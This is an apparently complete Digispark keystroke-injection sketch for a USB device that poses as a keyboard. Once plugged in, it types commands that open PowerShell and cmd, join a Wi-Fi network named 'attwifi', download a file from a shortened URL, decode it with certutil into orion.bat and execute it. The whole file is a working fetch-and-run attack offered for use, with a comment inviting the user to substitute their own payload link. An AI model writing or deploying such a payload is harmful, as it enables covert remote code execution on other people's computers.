#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.update(); // call init to enumerate
  pinMode(1, OUTPUT);
}

void loop() {
 delay(500);
 DigiKeyboard.update();
 delay(500);
 DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
 delay(100);
 DigiKeyboard.sendKeyStroke(76);
 delay(100);
 DigiKeyboard.println("powershell");
 delay(1000);
 DigiKeyboard.println("cmd.exe");
 delay(100);
 DigiKeyboard.println("netsh wlan connect name=attwifi");
 delay(10000);
 DigiKeyboard.println("exit");
 delay(50);
 DigiKeyboard.println("$result = Invoke-WebRequest -Uri 'https://goo.gl/yOsfA6'"); //REPLACE with link to emerald.txt
 delay(2000);
 DigiKeyboard.println("$result.content | Out-File 'emerald.txt'"); //2
 delay(100);
 DigiKeyboard.println("cmd.exe");
 delay(700);
 DigiKeyboard.println("certutil -decode emerald.txt orion.bat >nul");
 delay(500);
 DigiKeyboard.println("orion.bat");
 delay(100);
 digitalWrite(1, HIGH);
 delay(900000);
}
